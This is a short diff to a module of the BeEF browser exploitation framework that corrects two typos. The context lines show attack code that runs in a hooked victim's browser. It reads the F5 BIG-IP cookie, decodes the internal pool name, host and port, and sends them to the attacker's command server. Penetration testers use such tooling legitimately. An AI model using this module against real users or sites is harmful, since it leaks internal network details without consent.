@@ -69,7 +69,7 @@ beef.execute(function() {
     BIGipCookieValue = m[0].split('=')[1];
     result = 'BigIP_cookie_name=' + BIGipCookieName;
 
-    // Retreive pool name via cookie name
+    // Retrieve pool name via cookie name
     if (BIGipCookieName.match(/^BIGipServer/) !== null) {
       poolName = BIGipCookieName.split('BIGipServer')[1];
       result += '&pool_name=' + poolName;
@@ -84,6 +84,6 @@ beef.execute(function() {
     backend = f5CookieDecode(BIGipCookieValue);
     result += '&host=' + backend.host + '&port=' + backend.port;
   }
-  else result = 'result=BigIP coookie not found'
+  else result = 'result=BigIP cookie not found'
   beef.net.send('<%= @command_url %>', <%= @command_id %>, result);
 });
